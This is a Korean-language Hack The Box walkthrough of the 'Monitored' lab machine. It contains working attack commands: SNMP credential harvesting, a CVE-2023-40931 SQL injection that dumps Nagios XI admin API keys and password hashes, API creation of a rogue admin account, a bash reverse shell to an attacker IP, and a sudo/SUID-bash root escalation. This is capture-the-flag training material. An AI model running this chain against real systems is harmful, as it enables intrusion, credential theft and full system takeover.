---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/solved
  - tech/lin/sudo-abuse
  - tech/db/mysql
  - tech/svc/snmp
  - tech/payload/revshell
type: machine
platform: htb
os: linux
ip: 10.129.230.96
domain: monitored.htb
ports: [22, 80, 389, 443, 5667]
services: [http, ldap, ssh, ssl/http]
cves: [CVE-2023-40931]
status: solved
tech_count: 4
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ nnmap 10.129.230.96                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 15:39 +0900
Nmap scan report for 10.129.230.96
Host is up (0.23s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Debian)
5667/tcp open  tcpwrapped
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   225.70 ms 10.10.14.1
2   226.27 ms 10.129.230.96

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.36 seconds


```


## Initial Access

Nagios XI 사용중
```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ whatweb https://nagios.monitored.htb 
https://nagios.monitored.htb [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.129.230.96], JQuery[3.6.0], Script[text/javascript], Title[Nagios XI]    
```

public
```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.230.96
Scanning 1 hosts, 3218 communities
10.129.230.96 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
10.129.230.96 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
```

SNMP 기록 확인
```bash
snmpbulkwalk -v2c -c public 10.129.230.96 | tee snmp
iso.3.6.1.2.1.1.1.0 = STRING: "Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (567930) 1:34:39.30
iso.3.6.1.2.1.1.4.0 = STRING: "Me <root@monitored.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "monitored"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1747) 0:00:17.47
...
...
...
iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.97.108.108.105.110.103 = STRING: "_triggerFire"
iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.105.114.101.100 = STRING: "_triggerFire"
iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.82.105.115.105.110.103 = STRING: "_triggerFire"
iso.3.6.1.2.1.92.1.1.1.0 = Gauge32: 1000
iso.3.6.1.2.1.92.1.1.2.0 = Gauge32: 1440
iso.3.6.1.2.1.92.1.2.1.0 = Counter32: 0
iso.3.6.1.2.1.92.1.2.2.0 = Counter32: 0

```

SNMP 기록에서 svc 자격증명 획득 `svc/XjH7VCehowpR1xZB`
```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ cat snmp | grep -i / 
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.10.0-28-amd64 root=UUID=d8761c35-f10f-4e79-b24c-38a65ad7ce1b ro net.ifnames=0 biosdevname=0 quiet
iso.3.6.1.2.1.25.2.3.1.3.35 = STRING: "/run"
iso.3.6.1.2.1.25.2.3.1.3.36 = STRING: "/"
iso.3.6.1.2.1.25.2.3.1.3.38 = STRING: "/dev/shm"
iso.3.6.1.2.1.25.2.3.1.3.39 = STRING: "/run/lock"
iso.3.6.1.2.1.25.3.8.1.2.5 = STRING: "/run"
iso.3.6.1.2.1.25.3.8.1.2.6 = STRING: "/"
iso.3.6.1.2.1.25.3.8.1.2.8 = STRING: "/dev/shm"
iso.3.6.1.2.1.25.3.8.1.2.9 = STRING: "/run/lock"
iso.3.6.1.2.1.25.4.2.1.2.6 = STRING: "kworker/0:0H-events_highpri"
iso.3.6.1.2.1.25.4.2.1.2.11 = STRING: "ksoftirqd/0"
iso.3.6.1.2.1.25.4.2.1.2.13 = STRING: "migration/0"
iso.3.6.1.2.1.25.4.2.1.2.15 = STRING: "cpuhp/0"
iso.3.6.1.2.1.25.4.2.1.2.16 = STRING: "cpuhp/1"
iso.3.6.1.2.1.25.4.2.1.2.17 = STRING: "migration/1"
iso.3.6.1.2.1.25.4.2.1.2.18 = STRING: "ksoftirqd/1"
iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "kworker/1:0H-events_highpri"
iso.3.6.1.2.1.25.4.2.1.2.54 = STRING: "kworker/1:1-events"
iso.3.6.1.2.1.25.4.2.1.2.55 = STRING: "kworker/0:1H-kblockd"
iso.3.6.1.2.1.25.4.2.1.2.58 = STRING: "irq/24-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.59 = STRING: "irq/25-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.60 = STRING: "irq/26-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.61 = STRING: "irq/27-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.62 = STRING: "irq/28-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.63 = STRING: "irq/29-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.64 = STRING: "irq/30-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.65 = STRING: "irq/31-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.66 = STRING: "irq/32-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.67 = STRING: "irq/33-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.68 = STRING: "irq/34-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.69 = STRING: "irq/35-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.70 = STRING: "irq/36-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.71 = STRING: "irq/37-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.72 = STRING: "irq/38-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.73 = STRING: "irq/39-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.74 = STRING: "irq/40-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.75 = STRING: "irq/41-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.76 = STRING: "irq/42-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.77 = STRING: "irq/43-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.78 = STRING: "irq/44-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.79 = STRING: "irq/45-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.80 = STRING: "irq/46-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.81 = STRING: "irq/47-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.82 = STRING: "irq/48-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.83 = STRING: "irq/49-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.84 = STRING: "irq/50-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.85 = STRING: "irq/51-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.86 = STRING: "irq/52-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.87 = STRING: "irq/53-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.88 = STRING: "irq/54-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.89 = STRING: "irq/55-pciehp"
iso.3.6.1.2.1.25.4.2.1.2.105 = STRING: "kworker/u5:0"
iso.3.6.1.2.1.25.4.2.1.2.149 = STRING: "kworker/1:1H-kblockd"
iso.3.6.1.2.1.25.4.2.1.2.155 = STRING: "mpt/0"
iso.3.6.1.2.1.25.4.2.1.2.246 = STRING: "kworker/u4:29-flush-8:0"
iso.3.6.1.2.1.25.4.2.1.2.285 = STRING: "jbd2/sda1-8"
iso.3.6.1.2.1.25.4.2.1.2.375 = STRING: "kworker/0:3-events"
iso.3.6.1.2.1.25.4.2.1.2.390 = STRING: "irq/16-vmwgfx"
iso.3.6.1.2.1.25.4.2.1.2.2442 = STRING: "kworker/0:0"
iso.3.6.1.2.1.25.4.2.1.2.2799 = STRING: "kworker/1:0-events"
iso.3.6.1.2.1.25.4.2.1.2.3006 = STRING: "kworker/u4:0-ext4-rsv-conversion"
iso.3.6.1.2.1.25.4.2.1.2.3842 = STRING: "kworker/u4:1-flush-8:0"
iso.3.6.1.2.1.25.4.2.1.4.1 = STRING: "/sbin/init"
iso.3.6.1.2.1.25.4.2.1.4.324 = STRING: "/lib/systemd/systemd-journald"
iso.3.6.1.2.1.25.4.2.1.4.346 = STRING: "/lib/systemd/systemd-udevd"
iso.3.6.1.2.1.25.4.2.1.4.482 = STRING: "/usr/bin/VGAuthService"
iso.3.6.1.2.1.25.4.2.1.4.484 = STRING: "/usr/bin/vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.4.489 = STRING: "/sbin/auditd"
iso.3.6.1.2.1.25.4.2.1.4.492 = STRING: "/usr/local/sbin/laurel"
iso.3.6.1.2.1.25.4.2.1.4.563 = STRING: "/usr/sbin/cron"
iso.3.6.1.2.1.25.4.2.1.4.564 = STRING: "/usr/bin/dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.4.568 = STRING: "/usr/sbin/rsyslogd"
iso.3.6.1.2.1.25.4.2.1.4.569 = STRING: "/lib/systemd/systemd-logind"
iso.3.6.1.2.1.25.4.2.1.4.570 = STRING: "/sbin/dhclient"
iso.3.6.1.2.1.25.4.2.1.4.571 = STRING: "/sbin/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.4.575 = STRING: "/usr/sbin/CRON"
iso.3.6.1.2.1.25.4.2.1.4.603 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.723 = STRING: "/usr/local/nagios/bin/npcd"
iso.3.6.1.2.1.25.4.2.1.4.730 = STRING: "/usr/sbin/snmptrapd"
iso.3.6.1.2.1.25.4.2.1.4.746 = STRING: "/usr/sbin/snmpd"
iso.3.6.1.2.1.25.4.2.1.4.751 = STRING: "/sbin/agetty"
iso.3.6.1.2.1.25.4.2.1.4.754 = STRING: "/usr/sbin/ntpd"
iso.3.6.1.2.1.25.4.2.1.4.769 = STRING: "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
iso.3.6.1.2.1.25.4.2.1.4.804 = STRING: "/usr/bin/shellinaboxd"
iso.3.6.1.2.1.25.4.2.1.4.806 = STRING: "/usr/bin/shellinaboxd"
iso.3.6.1.2.1.25.4.2.1.4.823 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.838 = STRING: "/usr/lib/postgresql/13/bin/postgres"
iso.3.6.1.2.1.25.4.2.1.4.870 = STRING: "postgres: 13/main: checkpointer "
iso.3.6.1.2.1.25.4.2.1.4.871 = STRING: "postgres: 13/main: background writer "
iso.3.6.1.2.1.25.4.2.1.4.872 = STRING: "postgres: 13/main: walwriter "
iso.3.6.1.2.1.25.4.2.1.4.873 = STRING: "postgres: 13/main: autovacuum launcher "
iso.3.6.1.2.1.25.4.2.1.4.874 = STRING: "postgres: 13/main: stats collector "
iso.3.6.1.2.1.25.4.2.1.4.875 = STRING: "postgres: 13/main: logical replication launcher "
iso.3.6.1.2.1.25.4.2.1.4.896 = STRING: "/usr/sbin/slapd"
iso.3.6.1.2.1.25.4.2.1.4.897 = STRING: "/usr/sbin/mariadbd"
iso.3.6.1.2.1.25.4.2.1.4.909 = STRING: "/usr/bin/perl"
iso.3.6.1.2.1.25.4.2.1.4.913 = STRING: "/usr/bin/perl"
iso.3.6.1.2.1.25.4.2.1.4.933 = STRING: "/usr/local/nagios/bin/nagios"
iso.3.6.1.2.1.25.4.2.1.4.934 = STRING: "/usr/local/nagios/bin/nagios"
iso.3.6.1.2.1.25.4.2.1.4.935 = STRING: "/usr/local/nagios/bin/nagios"
iso.3.6.1.2.1.25.4.2.1.4.936 = STRING: "/usr/local/nagios/bin/nagios"
iso.3.6.1.2.1.25.4.2.1.4.937 = STRING: "/usr/local/nagios/bin/nagios"
iso.3.6.1.2.1.25.4.2.1.4.941 = STRING: "/usr/sbin/xinetd"
iso.3.6.1.2.1.25.4.2.1.4.1000 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1001 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1002 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1003 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1362 = STRING: "/usr/local/nagios/bin/nagios"
iso.3.6.1.2.1.25.4.2.1.4.1379 = STRING: "/bin/bash"
iso.3.6.1.2.1.25.4.2.1.4.1442 = STRING: "/usr/sbin/exim4"
iso.3.6.1.2.1.25.4.2.1.4.1908 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1912 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1916 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1917 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1918 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1919 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.4099 = STRING: "/usr/sbin/CRON"
iso.3.6.1.2.1.25.4.2.1.4.4100 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.4101 = STRING: "/usr/bin/php"
iso.3.6.1.2.1.25.4.2.1.5.492 = STRING: "--config /etc/laurel/config.toml"
iso.3.6.1.2.1.25.4.2.1.5.570 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
iso.3.6.1.2.1.25.4.2.1.5.571 = STRING: "-u -s -O /run/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.5.603 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
iso.3.6.1.2.1.25.4.2.1.5.723 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
iso.3.6.1.2.1.25.4.2.1.5.730 = STRING: "-LOw -f -p /run/snmptrapd.pid"
iso.3.6.1.2.1.25.4.2.1.5.746 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.754 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
iso.3.6.1.2.1.25.4.2.1.5.838 = STRING: "-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf"
iso.3.6.1.2.1.25.4.2.1.5.896 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
iso.3.6.1.2.1.25.4.2.1.5.909 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.913 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.933 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.934 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.935 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.936 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.937 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.941 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
iso.3.6.1.2.1.25.4.2.1.5.1362 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.1378 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1379 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.4100 = STRING: "-c /usr/bin/php -q /usr/local/nagiosxi/cron/cmdsubsys.php >> /usr/local/nagiosxi/var/cmdsubsys.log 2>&1"
iso.3.6.1.2.1.25.4.2.1.5.4101 = STRING: "-q /usr/local/nagiosxi/cron/cmdsubsys.php"

```

Nagios XI API를 이용하여 인증 토큰 발급
```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ curl "http://10.129.230.96/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&password=XjH7VCehowpR1xZB"
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "ffc95804112a7e383f7f8ade2f40ac17ae31dc43",
    "valid_min": 5,
    "valid_until": "Mon, 16 Mar 2026 01:41:42 -0400"
}

```

해당 토큰으로 메인 페이지 접근 성공 5.11.0 버전 확인

POC다운로드
[https://github.com/G4sp4rCS/CVE-2023-40931-POC.git](https://github.com/G4sp4rCS/CVE-2023-40931-POC.git)

```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ git clone https://github.com/G4sp4rCS/CVE-2023-40931-POC
Cloning into 'CVE-2023-40931-POC'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (15/15), done.
Receiving objects: 100% (18/18), 5.24 KiB | 5.24 MiB/s, done.
remote: Total 18 (delta 6), reused 14 (delta 2), pack-reused 0 (from 0)
Resolving deltas: 100% (6/6), done.

```


POC 실행하여 DB 내 관리자 계정과 API Key 획득

```bash
Database: nagiosxi 
Table: xi_users
 [2 entries] +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ | user_id | email | name | api_key | enabled | password | username | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket | last_edited_by | login_attempts | last_password_change | +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ | 1 | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1 | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0 | 1701931372 | 1 | 1701427555 | 0 | 0 | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0 | 5 | 0 | 1701427555 | | 2 | svc@monitored.htb | svc | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0 | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc | 1 | 1699724476 | 1 | 1699728200 | 1699634403 | 1715201011 | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1 | 7 | 1699697433 | +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
```

계정 생성하려 했지만 에러
```bash
┌──(kali㉿kali)-[~/HTB/Monitored/CVE-2023-40931-POC]
└─$ curl -X POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -s | jq .
{
  "error": "Could not create user. Missing required fields.",
  "missing": [
    "username",
    "email",
    "name",
    "password"
  ]
}

```

auth_level=admin 사용하여 다시 시도
```bash
curl -d "username=qq&password=a123a123&name=qq&email=qq@monitored.htb&auth_level=admin&force_pw_change=0" -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'

{"success":"User account qq was added successfully!","user_id":7}


```

관리자 로그인
![[Pasted image 20260316150524.png]]

커맨드 추가
![[Pasted image 20260316151039.png]]

리버스쉘 실행
```
bash -c 'bash -i &> /dev/tcp/10.10.14.42/4444 0>&1'
```

![[Pasted image 20260316151132.png]]

리버스쉘 실행 버튼 생성
![[Pasted image 20260316151445.png]]

![[Pasted image 20260316151518.png]]


리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.230.96] 37524
bash: cannot set terminal process group (7227): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ whoami
whoami
nagios


```

user.txt 획득
![[Pasted image 20260316152104.png]]


sudo 권한 확인
```bash
nagios@monitored:~$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *

```


스크립트 생성
```bash


echo '#!/bin/bash' > /tmp/q.sh
echo 'cp /bin/bash /tmp/qq' >> /tmp/q.sh
echo 'chown root:root /tmp/qq' >> /tmp/q.sh
echo 'chmod 6777 /tmp/qq' >> /tmp/q.sh



nagios@monitored:~$ cat /tmp/q.sh
#!/bin/bash

cp /bin/bash /tmp/qq
chown root:root /tmp/qq
chmod 6777 /tmp/qq

nagios@monitored:/usr/local/nagios/bin$ cp /tmp/q.sh nagios
cp /tmp/q.sh nagios
nagios@monitored:/usr/local/nagios/bin$ chmod +x nagios
chmod +x nagios

```

sudo 권한으로 재시작
```bash
nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
</nagiosxi/scripts/manage_services.sh restart nagios
Job for nagios.service failed because the control process exited with error code.
See "systemctl status nagios.service" and "journalctl -xe" for details.
```

root 권한으로 생성된 /tmp/qq(/bin/bash) 파일
```bash
nagios@monitored:/usr/local/nagios/bin$ ls -al /tmp
ls -al /tmp
total 1264
drwxrwxrwt 11 root   root      4096 Mar 16 02:50 .
drwxr-xr-x 19 root   root      4096 Mar 27  2024 ..
drwxrwxrwt  2 root   root      4096 Mar 16 00:48 .font-unix
drwxrwxrwt  2 root   root      4096 Mar 16 00:48 .ICE-unix
-rw-r--r--  1 nagios nagios      24 Mar 16 02:35 memcalc
-rw-r--r--  1 nagios nagios      19 Mar 16 02:30 q
-rwsrwsrwx  1 root   root   1234376 Mar 16 02:50 qq
-rw-r--r--  1 nagios nagios      76 Mar 16 02:49 q.sh
drwx------  3 root   root      4096 Mar 16 00:48 systemd-private-c1fff31dec8a4f48b861f4718be68e61-apache2.service-AZppvg
drwx------  3 root   root      4096 Mar 16 00:48 systemd-private-c1fff31dec8a4f48b861f4718be68e61-ntp.service-YX0ylj
drwx------  3 root   root      4096 Mar 16 00:48 systemd-private-c1fff31dec8a4f48b861f4718be68e61-systemd-logind.service-b2mhDi
drwxrwxrwt  2 root   root      4096 Mar 16 00:48 .Test-unix
drwx------  2 root   root      4096 Mar 16 00:49 vmware-root_484-868851811
drwxrwxrwt  2 root   root      4096 Mar 16 00:48 .X11-unix
drwxrwxrwt  2 root   root      4096 Mar 16 00:48 .XIM-unix

```

-p권한을 유지하고 루트 권한으로 쉘 획득

```bash
nagios@monitored:/usr/local/nagios/bin$ /tmp/qq -p
```

root.txt 획득

![[Pasted image 20260316155251.png]]

